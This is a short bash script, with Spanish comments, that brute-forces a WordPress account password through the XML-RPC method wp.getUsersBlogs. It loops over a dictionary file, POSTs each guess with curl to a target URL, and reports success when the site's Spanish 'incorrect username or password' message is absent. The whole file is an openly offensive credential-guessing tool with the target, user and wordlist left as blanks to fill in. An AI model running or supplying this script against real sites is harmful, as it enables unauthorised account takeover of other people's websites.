#!/bin/bash 

function salir() {
    rm -f log.log getUsers.xml
    exit 1
}   

trap salir SIGINT

DIC_PATH=""
USERNAME=""
URL=""

# Asegúrate de que el archivo de diccionario existe
if [ ! -f "$DIC_PATH" ]; then
    echo "El archivo de diccionario no existe."
    exit 1
fi

for i in $(cat $DIC_PATH); do
    variable=$(cat <<FIN
<?xml version="1.0" encoding="UTF-8"?>
<methodCall>
  <methodName>wp.getUsersBlogs</methodName>
  <params>
    <param><value>${USERNAME}</value></param>
    <param><value>${i}</value></param>
  </params>
</methodCall>
FIN
)
    echo -e "$variable" > getUsers.xml
    echo -e "[+] Probamos con la contraseña $i"
    curl -s -X POST "$URL" -d @getUsers.xml >> log.log
    
    #Respuesta definida por wp dependiendo del servidor
    if ! grep -q 'Nombre de usuario o contraseña incorrectos.' log.log; then
        echo -e "[+] La contraseña para $USERNAME es $i"
        rm -f log.log getUsers.xml
        exit 0
    fi
    sleep 1
done

rm -f log.log

